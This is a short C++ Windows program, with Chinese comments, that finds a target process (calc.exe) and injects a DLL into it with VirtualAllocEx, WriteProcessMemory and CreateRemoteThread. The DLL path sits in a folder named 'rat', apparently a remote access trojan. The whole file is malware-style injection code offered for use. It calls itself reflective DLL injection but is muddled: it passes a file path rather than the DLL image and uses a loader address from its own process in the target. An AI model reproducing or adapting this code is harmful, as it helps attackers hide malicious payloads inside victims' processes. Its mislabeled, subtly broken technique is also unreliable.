#include <windows.h>
#include <iostream>
#include <tlhelp32.h>

DWORD GetProcessIdByName(const char* processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);

    if (Process32First(hSnapshot, &pe)) {
        do {
            if (strcmp(pe.szExeFile, processName) == 0) {
                CloseHandle(hSnapshot);
                return pe.th32ProcessID;
            }
        } while (Process32Next(hSnapshot, &pe));
    }

    CloseHandle(hSnapshot);
    return 0;
}

void ReflectiveInject(DWORD processId, const char* dllPath) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (!hProcess) {
        std::cout << "Failed to open process\n";
        return;
    }

    //为目标进程中的DLL路径分配内存
    LPVOID pRemoteDllPath = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    WriteProcessMemory(hProcess, pRemoteDllPath, (LPVOID)dllPath, strlen(dllPath) + 1, NULL);

    //获取Reflective Loader地址
    HMODULE hModule = LoadLibraryA(dllPath);
    FARPROC pReflectiveLoad = GetProcAddress(hModule, "ReflectiveLoad");

    //创建远程进程来执行Reflective Loader
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pReflectiveLoad, pRemoteDllPath, 0, NULL);
    if (hThread) {
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
    }

    //清理
    VirtualFreeEx(hProcess, pRemoteDllPath, 0, MEM_RELEASE);
    CloseHandle(hProcess);
}

int main() {
    const char* targetProcessName = "calc.exe"; //替换为目标进程名称
    const char* dllPath = "C:\\Users\\snowwolf\\Desktop\\rat\\dll\\ReflectiveLoader.dll"; //反射DLL的路径

    DWORD processId = GetProcessIdByName(targetProcessName);
    if (processId) {
        ReflectiveInject(processId, dllPath);
        std::cout << "Reflective DLL injection completed.\n";
           } else {
            std::cout << "Target process not found.\n";
        }

    return 0;
}
